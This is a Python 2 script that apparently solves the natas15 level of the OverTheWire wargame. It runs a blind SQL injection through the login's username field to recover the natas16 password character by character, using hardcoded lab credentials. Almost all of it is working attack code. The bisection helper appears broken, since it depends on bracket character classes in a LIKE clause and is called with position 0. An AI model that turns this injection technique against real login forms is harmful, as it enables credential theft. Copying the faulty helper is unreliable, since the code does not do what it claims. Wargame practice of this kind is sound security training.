import base64

import requests

TARGET_URL = 'http://natas15.natas.labs.overthewire.org/index.php'

CHARSET = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'

def build_query(position, value):
    return 'natas16" AND SUBSTRING(password, %d, 1) like binary "%s' % (position, value)

def build_long_query(position, chars):
    return 'natas16" AND binary SUBSTRING(password, %d, 1) like "[%s]' % (position, chars)

def check_char(position, value):
    r = requests.post(TARGET_URL,
        data={'username': build_query(position, value)},
        auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
    if 'Error in query.' in r.text:
        raise RuntimeError("error in query " + r.text)
    return 'This user exists.' in r.text

def does_password_have_c_at(chars, position):
    r = requests.post(TARGET_URL,
        data={'username': build_long_query(position, chars)},
        auth=('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'))
    if 'Error in query.' in r.text:
        raise RuntimeError("error in query " + r.text)
    return 'This user exists.' in r.text

def find_char_at_position(position, available=CHARSET):
    if len(available) == 1:
        return available

    # first split into 2 parts
    parta, partb = available[:len(available)/2], available[len(available)/2:]

    print 'test', parta, position
    if does_password_have_c_at(parta, position):
        return find_char_at_position(position, parta)
    else:
        return find_char_at_position(position, partb)

def find_char(position):
    for c in CHARSET:
        if check_char(position, c):
            return c
    return None

find_char_at_position(0)
find_char_at_position(1)

password = ''
for i in xrange(1, 33):
    c = find_char(i)
    if c is not None:
        password += c
        print i, password
    else:
        print 'DOne'
        break
